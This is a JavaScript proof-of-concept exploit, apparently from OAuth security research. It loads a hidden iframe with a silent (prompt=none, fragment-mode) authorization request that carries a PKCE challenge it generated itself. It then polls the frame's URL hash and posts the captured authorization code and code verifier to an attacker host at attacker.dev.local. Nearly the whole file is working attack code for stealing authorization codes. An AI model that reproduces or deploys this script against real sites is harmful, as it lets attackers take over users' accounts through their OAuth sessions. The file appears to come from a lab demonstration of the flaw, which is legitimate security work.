// Iframe with PKCE, code verifier is generated on the frontend

const ATTACKER_HOST = 'https://attacker.dev.local:5443'
const MODE = 'pkce-front' // 'default' | 'pkce-front' | 'pkce-back'

async function getAuthorizationRequestURL(mode) {
    let queryParams;
    if (mode) {
        queryParams = `?mode=${mode}`
    }
    else {
        queryParams = ''
    }

    let response = await fetch(`/login/start${queryParams}`);
    let data = await response.json();
    let url = `${data.url}&response_mode=fragment&prompt=none`; // modify initial authorization URL
    return url;

}

function injectIframe(url) {
    let ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.style.width = "1px";
    ifrm.style.height = "1px";
    ifrm.style.display = "none";
    ifrm.setAttribute("id", 'test');
    document.body.appendChild(ifrm);
    return ifrm;
}

async function stealAuthorizationResponse(frameObj, timerRef, codeVerifier) {
    let hash = frameObj?.contentDocument?.location?.hash;
    if (hash.includes("code")) {
        frameObj.contentWindow.stop();
        clearInterval(timerRef);
        let code = hash.split('code=')[1];

        response = await sendAuthorizationResponseToAttacker(code, `${ATTACKER_HOST}/authorization-response?mode=${MODE}`, codeVerifier);
        if (response?.error === true) {
            return false;
        }
        console.log(`Authorization code: ${code}\nand code_verifier: ${codeVerifier}\nsent to the attacker`);
    }

}

async function sendAuthorizationResponseToAttacker(code, maliciousUrl, codeVerifier) {
    let body = {
        code: code,
        codeVerifier: codeVerifier
    }
    let response = await fetch(maliciousUrl, {
        method: 'POST', headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });
    response = await response.json();
    return response;
}

function generateCodeVerifier(length = 43) {
    const possibleChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
    const array = new Uint8Array(length);
    crypto.getRandomValues(array);

    return Array.from(array, byte => possibleChars[byte % possibleChars.length]).join('');
}

async function sha256(plain) {
    let encoder = new TextEncoder();
    let data = encoder.encode(plain);

    return window.crypto.subtle.digest('SHA-256', data); // hash from byte array
}

function base64UrlEncode(a) {
    return btoa(String.fromCharCode.apply(null, new Uint8Array(a)))
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); // symbols replace to make modified base64 for URL
}


(async function () {
    let codeVerifier = generateCodeVerifier();
    console.log(`Code verifier created: ${codeVerifier}`)
    // let codeVerifier = '1234567890123456789012345678901234567890123456789012345678901234'; // for testing
    // sessionStorage.setItem("codeVerifier", codeVerifier);
    let hashed = await sha256(codeVerifier);
    let codeChallenge = base64UrlEncode(hashed);
    console.log(`Code challenge created: ${codeChallenge}`)
    let url = `${await getAuthorizationRequestURL(MODE)}&code_challenge=${codeChallenge}&code_challenge_method=S256`;;
    let ifrm = injectIframe(url);
    let timer = setInterval(() => stealAuthorizationResponse(ifrm, timer, codeVerifier), 1);

    // fallback
    setTimeout(() => {
        clearInterval(timer);
    }, 5000);
})();
